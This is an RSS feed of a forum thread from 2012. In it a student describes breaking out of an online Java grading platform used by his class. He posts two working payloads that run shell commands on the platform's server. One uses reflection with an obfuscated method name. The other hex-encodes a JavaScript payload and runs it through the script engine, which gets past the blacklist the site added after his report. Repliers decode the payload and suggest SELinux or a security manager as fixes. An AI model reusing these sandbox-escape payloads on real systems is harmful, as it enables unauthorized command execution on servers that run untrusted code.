<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Computer Science Class</title>
    <link>https://forum.moparisthebest.com/t/computer-science-class/470230</link>
    <description>Before you read, know that I do not want to harm the website I am speaking of and I have already contacted them about the vulnerability I found. I don&#39;t advocate hacking. 

My class went from a pencil and paper curriculum to using a 3rd party online site, which is where we do all our tests/labs. The class I take allows for java to be run on a server which then gives you instant feedback on problems/labs/tests and is pretty damn sweet. Odd thing I noticed though is that there didn&#39;t seem to be a limit on what you could do. So out of curiosity, and since the class is really damn boring (I&#39;ve took it about two years back and since it is the highest level my school offers I took it again) I began to poke around. I tried to see if there was any way to run shell commands (well at the time I didn&#39;t know any information about the server that compiled/executed code), and found that they blocked the Runtime.getRuntime() method. I figured they would, so by second nature I tried the reflection route and was shocked to see that reflection was not blacklisted. 

So I quickly wrote up this:

[code]
Class runtimeClass = Class.forName(&quot;java.lang.Runtime&quot;);
char[] runtimeMethodName = new char[] { 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 };
java.lang.reflect.Method runtimeMethod = runtimeClass.getMethod(new String(runtimeMethodName));
java.lang.reflect.Method execMethod = runtimeClass.getMethod(&quot;exec&quot;, String.class);
Object runtime = runtimeMethod.invoke(null);
java.lang.Process process = (java.lang.Process) execMethod.invoke(runtime, &quot;ls&quot;);
java.util.Scanner scanner = new java.util.Scanner(process.getInputStream());
String output = &quot;&quot;;
while(scanner.hasNext()) {
    output += &quot; &quot; + scanner.next();
}
System.out.println(output);
[/code]

Come to find out that the server has Ubuntu installed, and I don&#39;t know if there is anything that I cannot do. It is definitely [b]not[/b] sandboxed. I shoot them an anonymous email showing them the code, telling them how it works, and leave it at that. Come back the next day to find that the terms &#39;java.lang.Process&#39;, &#39;java.lang.Runtime&#39; are sanitized from the text. So they obviously got the email and reacted to it. Then, I got bored again. Went a different route:

[code]
/* 
var runtimeClass = java.lang.Class.forName(&quot;java.lang.Runtime&quot;);
var runtimeMethod = runtimeClass.getMethod(&quot;getRuntime&quot;);
var execMethod = runtimeClass.getMethod(&quot;exec&quot;, java.lang.Class.forName(&quot;java.lang.String&quot;));
var runtime = runtimeMethod.invoke(null);
var process = execMethod.invoke(runtime, &quot;ls&quot;);
var scanner = new java.util.Scanner(process.getInputStream()); 
*/
String[] chars = &quot;76 61 72 20 72 75 6e 74 69 6d 65 43 6c 61 73 73 20 3d 20 6a 61 76 61 2e 6c 61 6e 67 2e 43 6c 61 73 73 2e 66 6f 72 4e 61 6d 65 28 22 6a 61 76 61 2e 6c 61 6e 67 2e 52 75 6e 74 69 6d 65 22 29 3b 0d 0a 76 61 72 20 72 75 6e 74 69 6d 65 4d 65 74 68 6f 64 20 3d 20 72 75 6e 74 69 6d 65 43 6c 61 73 73 2e 67 65 74 4d 65 74 68 6f 64 28 22 67 65 74 52 75 6e 74 69 6d 65 22 29 3b 0d 0a 76 61 72 20 65 78 65 63 4d 65 74 68 6f 64 20 3d 20 72 75 6e 74 69 6d 65 43 6c 61 73 73 2e 67 65 74 4d 65 74 68 6f 64 28 22 65 78 65 63 22 2c 20 6a 61 76 61 2e 6c 61 6e 67 2e 43 6c 61 73 73 2e 66 6f 72 4e 61 6d 65 28 22 6a 61 76 61 2e 6c 61 6e 67 2e 53 74 72 69 6e 67 22 29 29 3b 0d 0a 76 61 72 20 72 75 6e 74 69 6d 65 20 3d 20 72 75 6e 74 69 6d 65 4d 65 74 68 6f 64 2e 69 6e 76 6f 6b 65 28 6e 75 6c 6c 29 3b 0d 0a 76 61 72 20 70 72 6f 63 65 73 73 20 3d 20 65 78 65 63 4d 65 74 68 6f 64 2e 69 6e 76 6f 6b 65 28 72 75 6e 74 69 6d 65 2c 20 22 6c 73 22 29 3b 0d 0a 76 61 72 20 73 63 61 6e 6e 65 72 20 3d 20 6e 65 77 20 6a 61 76 61 2e 75 74 69 6c 2e 53 63 61 6e 6e 65 72 28 70 72 6f 63 65 73 73 2e 67 65 74 49 6e 70 75 74 53 74 72 65 61 6d 28 29 29 3b&quot;.split(&quot;[ ]&quot;);
char[] getClassCommandChars = new char[chars.length];
int counter = 0;
for(int i = 0; i &lt; chars.length; i++) {
    getClassCommandChars[counter] = (char) Integer.parseInt(chars[counter++], 16);
}
String getClassCommand = new String(getClassCommandChars);
javax.script.ScriptEngineManager factory = new javax.script.ScriptEngineManager();
javax.script.ScriptEngine engine = factory.getEngineByName(&quot;javascript&quot;); 
engine.eval(getClassCommand);
java.util.Scanner scanner = (java.util.Scanner) engine.get(&quot;scanner&quot;);
String output = &quot;&quot;;
while(scanner.hasNext()) {            
    output += &quot; &quot; + scanner.next();        
}        
System.out.println(output);
[/code]

Same result. I&#39;m sure there are many more, I didn&#39;t look java.util.File yet. How would one improve the security of this implementation? Not that I want to send them pointers, I could care less. I&#39;ve never worked with sandboxing applications and I&#39;m curious how one would sandbox a java app.</description>
    
    <lastBuildDate>Mon, 10 Dec 2012 05:05:28 +0000</lastBuildDate>
    <category>General Programming</category>
    <atom:link href="https://forum.moparisthebest.com/t/computer-science-class/470230.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Computer Science Class</title>
        <dc:creator><![CDATA[@T41 t4]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/t41">@T41</a> wrote:</p>
          <blockquote>
              <p>the l33t hacker is at it again</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/computer-science-class/470230/5">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/computer-science-class/470230/5</link>
        <pubDate>Mon, 10 Dec 2012 05:05:28 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-470230-5</guid>
        <source url="https://forum.moparisthebest.com/t/computer-science-class/470230.rss">Computer Science Class</source>
      </item>
      <item>
        <title>Computer Science Class</title>
        <dc:creator><![CDATA[@davidi2 Davidi2]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/davidi2">@davidi2</a> wrote:</p>
          <blockquote>
              <p>int counter = 0;<br>
for(int i = 0; i &lt; chars.length; i++) {<br>
getClassCommandChars[counter] = (char) Integer.parseInt(chars[counter++], 16);<br>
}</p>
<p>What?</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/computer-science-class/470230/4">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/computer-science-class/470230/4</link>
        <pubDate>Wed, 28 Nov 2012 09:46:41 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-470230-4</guid>
        <source url="https://forum.moparisthebest.com/t/computer-science-class/470230.rss">Computer Science Class</source>
      </item>
      <item>
        <title>Computer Science Class</title>
        <dc:creator><![CDATA[@sinisoul sini]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/sinisoul">@sinisoul</a> wrote:</p>
          <blockquote>
              <p>[quote=“HcoJustin, post:2, topic:470230”]Out of curiosity, what does</p>
<pre><code class="lang-auto"></code></pre>
<p>come out to?</p>
<p>Theoretically they could run the code on the server with a strict security manager, but I’m sure there are still ways to get around that. As for sandboxing they could use SELinux (or possibly AppArmor?) to limit what the application has access to, they should already be included with Ubuntu[/quote]</p>
<pre><code class="lang-auto">var runtimeClass = java.lang.Class.forName("java.lang.Runtime");
var runtimeMethod = runtimeClass.getMethod("getRuntime");
var execMethod = runtimeClass.getMethod("exec", java.lang.Class.forName("java.lang.String"));
var runtime = runtimeMethod.invoke(null);
var process = execMethod.invoke(runtime, "ls");
var scanner = new java.util.Scanner(process.getInputStream()); </code></pre>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/computer-science-class/470230/3">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/computer-science-class/470230/3</link>
        <pubDate>Wed, 28 Nov 2012 09:44:47 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-470230-3</guid>
        <source url="https://forum.moparisthebest.com/t/computer-science-class/470230.rss">Computer Science Class</source>
      </item>
      <item>
        <title>Computer Science Class</title>
        <dc:creator><![CDATA[@HcoJustin HcoJustin]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/hcojustin">@HcoJustin</a> wrote:</p>
          <blockquote>
              <p>Out of curiosity, what does</p>
<pre><code class="lang-auto"></code></pre>
<p>come out to?</p>
<p>Theoretically they could run the code on the server with a strict security manager, but I’m sure there are still ways to get around that. As for sandboxing they could use SELinux (or possibly AppArmor?) to limit what the application has access to, they should already be included with Ubuntu</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/computer-science-class/470230/2">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/computer-science-class/470230/2</link>
        <pubDate>Wed, 28 Nov 2012 06:20:13 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-470230-2</guid>
        <source url="https://forum.moparisthebest.com/t/computer-science-class/470230.rss">Computer Science Class</source>
      </item>
      <item>
        <title>Computer Science Class</title>
        <dc:creator><![CDATA[@sinisoul sini]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/sinisoul">@sinisoul</a> wrote:</p>
          <blockquote>
              <p>Before you read, know that I do not want to harm the website I am speaking of and I have already contacted them about the vulnerability I found. I don’t advocate hacking.</p>
<p>My class went from a pencil and paper curriculum to using a 3rd party online site, which is where we do all our tests/labs. The class I take allows for java to be run on a server which then gives you instant feedback on problems/labs/tests and is pretty damn sweet. Odd thing I noticed though is that there didn’t seem to be a limit on what you could do. So out of curiosity, and since the class is really damn boring (I’ve took it about two years back and since it is the highest level my school offers I took it again) I began to poke around. I tried to see if there was any way to run shell commands (well at the time I didn’t know any information about the server that compiled/executed code), and found that they blocked the Runtime.getRuntime() method. I figured they would, so by second nature I tried the reflection route and was shocked to see that reflection was not blacklisted.</p>
<p>So I quickly wrote up this:</p>
<pre><code class="lang-auto">Class runtimeClass = Class.forName("java.lang.Runtime");
char[] runtimeMethodName = new char[] { 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 };
java.lang.reflect.Method runtimeMethod = runtimeClass.getMethod(new String(runtimeMethodName));
java.lang.reflect.Method execMethod = runtimeClass.getMethod("exec", String.class);
Object runtime = runtimeMethod.invoke(null);
java.lang.Process process = (java.lang.Process) execMethod.invoke(runtime, "ls");
java.util.Scanner scanner = new java.util.Scanner(process.getInputStream());
String output = "";
while(scanner.hasNext()) {
    output += " " + scanner.next();
}
System.out.println(output);</code></pre>
<p>Come to find out that the server has Ubuntu installed, and I don’t know if there is anything that I cannot do. It is definitely <span class="bbcode-b">not</span> sandboxed. I shoot them an anonymous email showing them the code, telling them how it works, and leave it at that. Come back the next day to find that the terms ‘java.lang.Process’, ‘java.lang.Runtime’ are sanitized from the text. So they obviously got the email and reacted to it. Then, I got bored again. Went a different route:</p>
<pre><code class="lang-auto">/* 
var runtimeClass = java.lang.Class.forName("java.lang.Runtime");
var runtimeMethod = runtimeClass.getMethod("getRuntime");
var execMethod = runtimeClass.getMethod("exec", java.lang.Class.forName("java.lang.String"));
var runtime = runtimeMethod.invoke(null);
var process = execMethod.invoke(runtime, "ls");
var scanner = new java.util.Scanner(process.getInputStream()); 
*/
String[] chars = "76 61 72 20 72 75 6e 74 69 6d 65 43 6c 61 73 73 20 3d 20 6a 61 76 61 2e 6c 61 6e 67 2e 43 6c 61 73 73 2e 66 6f 72 4e 61 6d 65 28 22 6a 61 76 61 2e 6c 61 6e 67 2e 52 75 6e 74 69 6d 65 22 29 3b 0d 0a 76 61 72 20 72 75 6e 74 69 6d 65 4d 65 74 68 6f 64 20 3d 20 72 75 6e 74 69 6d 65 43 6c 61 73 73 2e 67 65 74 4d 65 74 68 6f 64 28 22 67 65 74 52 75 6e 74 69 6d 65 22 29 3b 0d 0a 76 61 72 20 65 78 65 63 4d 65 74 68 6f 64 20 3d 20 72 75 6e 74 69 6d 65 43 6c 61 73 73 2e 67 65 74 4d 65 74 68 6f 64 28 22 65 78 65 63 22 2c 20 6a 61 76 61 2e 6c 61 6e 67 2e 43 6c 61 73 73 2e 66 6f 72 4e 61 6d 65 28 22 6a 61 76 61 2e 6c 61 6e 67 2e 53 74 72 69 6e 67 22 29 29 3b 0d 0a 76 61 72 20 72 75 6e 74 69 6d 65 20 3d 20 72 75 6e 74 69 6d 65 4d 65 74 68 6f 64 2e 69 6e 76 6f 6b 65 28 6e 75 6c 6c 29 3b 0d 0a 76 61 72 20 70 72 6f 63 65 73 73 20 3d 20 65 78 65 63 4d 65 74 68 6f 64 2e 69 6e 76 6f 6b 65 28 72 75 6e 74 69 6d 65 2c 20 22 6c 73 22 29 3b 0d 0a 76 61 72 20 73 63 61 6e 6e 65 72 20 3d 20 6e 65 77 20 6a 61 76 61 2e 75 74 69 6c 2e 53 63 61 6e 6e 65 72 28 70 72 6f 63 65 73 73 2e 67 65 74 49 6e 70 75 74 53 74 72 65 61 6d 28 29 29 3b".split("[ ]");
char[] getClassCommandChars = new char[chars.length];
int counter = 0;
for(int i = 0; i &lt; chars.length; i++) {
    getClassCommandChars[counter] = (char) Integer.parseInt(chars[counter++], 16);
}
String getClassCommand = new String(getClassCommandChars);
javax.script.ScriptEngineManager factory = new javax.script.ScriptEngineManager();
javax.script.ScriptEngine engine = factory.getEngineByName("javascript"); 
engine.eval(getClassCommand);
java.util.Scanner scanner = (java.util.Scanner) engine.get("scanner");
String output = "";
while(scanner.hasNext()) {            
    output += " " + scanner.next();        
}        
System.out.println(output);</code></pre>
<p>Same result. I’m sure there are many more, I didn’t look java.util.File yet. How would one improve the security of this implementation? Not that I want to send them pointers, I could care less. I’ve never worked with sandboxing applications and I’m curious how one would sandbox a java app.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/computer-science-class/470230/1">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/computer-science-class/470230/1</link>
        <pubDate>Wed, 28 Nov 2012 04:08:42 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-470230-1</guid>
        <source url="https://forum.moparisthebest.com/t/computer-science-class/470230.rss">Computer Science Class</source>
      </item>
  </channel>
</rss>
